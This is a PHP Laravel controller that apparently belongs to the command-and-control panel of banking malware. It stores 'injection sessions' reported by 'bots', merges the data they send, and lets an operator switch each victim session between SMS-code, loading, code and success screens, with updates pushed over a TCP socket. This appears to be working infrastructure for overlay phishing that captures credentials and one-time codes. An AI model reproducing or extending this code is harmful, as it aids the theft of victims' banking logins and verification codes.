<?php

namespace App\Http\Controllers\Api\v1;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Models\Bot;
use App\Models\InjectionSession;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;
use JsonException;

class SmartInjectionController extends Controller
{
    public function index(Request $request): ApiResponse
    {
        $sessions = InjectionSession::orderByDesc('id')->paginate($request->get('per_page', 15));

        auth()->user()?->entitiesTimestamps?->update([
            'smart_injections' => Carbon::now()->toDateTimeString(),
        ]);

        return ApiResponse::success($sessions);
    }

    /**
     * @throws ValidationException
     * @throws JsonException
     */
    public function update(InjectionSession $session, Request $request): ApiResponse
    {
        $this->validate($request, [
            'action' => 'required|in:sms,loading,default,success,code',
        ]);

        $session->action = $request->get('action');

        if ($session->action === 'success') {
            $session->is_closed = true;
        }

        $session->update();

        $instance = stream_socket_client('tcp://127.0.0.1:' . config('app.tcpPort'));

        fwrite($instance, json_encode([
                'session_id' => $session->session_id,
                'message' => 'update',
            ], JSON_THROW_ON_ERROR) . "\n");

        return ApiResponse::success($session);
    }

    public function store(string $sessionId, Request $request): ApiResponse
    {
        if (empty($sessionId)) {
            return ApiResponse::error('Session id not found', 404);
        }

        $bot = Bot::find($request->get('bot_id'));

        $injectionSession = InjectionSession::firstOrCreate([
            'session_id' => $sessionId,
            'bot_id' => $bot ? $bot->id : "unknow",
            'application' => $request->get('application'),
        ]);

        $needUpdate = false;

        $action = $request->get('action');

        if ($action) {
            $injectionSession->action = $action;
            $needUpdate = true;
        }

        if ($request->get('data')) {
            $injectionSession->data = array_merge($injectionSession->data ?? [], $request->get('data') ?? []);
            $needUpdate = true;
        }

        if ($request->get('is_closed')) {
            $injectionSession->is_closed = $request->get('is_closed');
            $needUpdate = true;
        }

        if ($needUpdate) {
            $injectionSession->save();
        }

        return ApiResponse::success([
            'action' => $injectionSession->action,
        ]);
    }
}
